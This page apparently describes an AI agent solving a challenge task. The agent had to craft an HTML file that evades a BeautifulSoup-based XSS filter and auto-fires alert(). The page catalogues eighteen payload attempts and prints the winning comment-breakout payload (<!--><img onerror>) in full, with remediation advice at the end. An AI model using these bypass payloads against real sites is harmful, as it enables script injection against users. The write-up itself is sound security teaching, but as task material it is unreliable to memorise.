The mission

One file. One filter. One alert.

/app/filter.py rewrites HTML in-place to neutralize XSS. Your deliverable is /app/out.html — it must survive filtering and still auto-execute JavaScript when opened.

🧹

Hostile sanitizer

BeautifulSoup-based cleaner strips <script>, frames, embeds, objects, and every attribute whose name starts with on.

Defense
🧪

Strict acceptance test

test_outputs.py runs the filter, loads the result in a headless browser context, and asserts that alert() fired with no clicks.

Verifier
🧠

Parser mismatch

The winning strategy is not a new event name — it is a deserialization gap between BeautifulSoup tree and how browsers tokenize comments.

Insight
🔁

Iterate hard

SVG onload, meta refresh, base href, data URLs, case tricks, RTL overrides — seventeen misses before the comment breakout landed.

Process
⚙️

In-place CLI

Usage is simply python /app/filter.py <html_file>. Mutations happen on disk; verification copies first, then filters.

Tooling
🏁

Zero interaction

No click-to-activate payloads. The page must arm itself on load so the automated harness can observe the alert.

How the agent worked

From recon to green check

A compact loop: read the filter, invent a vector, write out.html, filter a copy, observe, adjust.

Recon

Open filter.py and test_outputs.py. Map stripped tags and the startswith("on") attribute ban.

Probe

Ship classic XSS vectors (svg/onload, meta javascript:, iframe). Confirm what the sanitizer deletes versus silently keeps.

Pivot

When event handlers die, try encoding, namespaces, Unicode RTL, CSS urls — hunting for attributes the checker never sees.

Exploit gap

Hide markup inside a comment node BeautifulSoup will not scan; craft markup browsers re-open as a real <img onerror>.

Adversary model

What filter.py thinks it blocks

Three blunt rules. Enough to stop textbook XSS. Not enough when the DOM tree and the byte stream disagree.

Sanitizer rules

BeautifulSoup
1
Kill script tags

Every <script> node is removed from the tree before serialization.

2
Drop nested navigators

<frame>, <iframe>, <object>, and <embed> are excised wholesale.

3
Strip on* handlers

For each tag from find_all(True), any attribute whose name starts with on is deleted — onclick, onerror, onload, ontoggle…

!
Blind spot: non-tags

Comment nodes, processing instructions, and weird textual edges never enter the attribute loop — payload provenance lives there.

Failure catalog

Payload lab notebook

Eighteen writes to out.html. Most were stripped clean. A few survived serialization but never alerted. One cracked both gates.

#01
SVG onload <svg onload="alert(...)">

Classic vector. Filter strips every on* attribute; empty svg remains.

Blocked
#02
Meta refresh to javascript: <meta http-equiv="refresh" content="0;url=javascript:alert(...)">

Survives filtering, but modern engines refuse javascript: in refresh — no alert.

Inert
#03
Harmless decoy attributes <img title="javascript:alert(...)">

Stored, never executed. Confirmed the harness needs a real script sink.

Blocked
#04
Base href javascript: <base href="javascript:alert(...);">

Kept by sanitizer in some trials; still no automatic execution path.

Blocked
#05
Anchor + autofocus <a href="javascript:alert(...)" autofocus>

Requires activation; violates zero-interaction rule even if present.

Blocked
#06-08
CSS & data URL sidecars link[href=data:text/css…] · style background:url(javascript:…)

Stylesheet channels ignored by both the filter JS rules and browser script policy.

Blocked
#09
Case variant onLoad <img src=x onLoad="alert(...)">

Attribute names normalize; startswith(on) still matches after lowercasing path.

Blocked
#10
Iframe data HTML <iframe src="data:text/html,<script>alert(...)</script>">

Entire iframe tag removed by rule #2 before any nested script matters.

Blocked
#11
Non-JS script type <script type="text/x-custom">alert(...)</script>

Tag-level removal does not care about MIME type.

Blocked
#12-14
Namespace / smuggling tricks ev:onload · broken quotes · newline-in-attribute illusions

Parser normalizes the tree; smuggled names never become real handlers.

Blocked
#15
Unicode RTL override x[U+202E]onload="alert(...)"

Bypasses startswith(on) visually, but browsers also do not treat it as onload.

Blocked
#16-17
HTML comment breakout <!--><img src=x onerror="alert('XSS Bypass!')">-->

BeautifulSoup keeps a Comment node untouched. Browsers close the empty comment at and execute the following img onerror. Test: Alert successfully triggered even after filtering!

Winning
Winning move

Comment nodes vs. real tags

The sanitizer only walks elements. Hide an event handler inside what the filter believes is a comment; let the browser disagree.

Final /app/out.html

Parser differential XSS

Two consumers, one byte string. BeautifulSoup serializes a single comment. HTML5 tokenizes an empty comment, then a live image tag.

<!-- final payload --> <!DOCTYPE html> <html> <head> <title>XSS Bypass</title> </head> <body> <!--><img src=x onerror="alert('XSS Bypass!')">--> </body> </html>
  • Filter view: one Comment whose text is ><img …> — no element attributes to strip.
  • Browser view: <!--> ends immediately; <img onerror> is real DOM; broken src fires handler.
  • Harness view: after in-place filter, alert text equals XSS Bypass! with no clicks.

FAQ

Quick answers

Why did meta refresh not count as a win?
The tag survived filter.py, but the acceptance test needs a real alert(). Chromium-family engines block javascript: URLs in refresh — so the harness never observed an alert.
Is <!--> a valid empty comment?
In HTML5 tokenization, a comment opened with <!-- can effectively close quickly when > appears in this degenerate form, leaving subsequent markup in the normal tree. BeautifulSoup comment node model is coarser and preserves the whole span.
Could the filter be fixed?
Yes — serialize with a stricter policy, deny-list dangerous URL schemes, walk strings inside comments, or run a browser-grade sanitizer instead of tree-rewriting only element attributes.
What does success look like in logs?
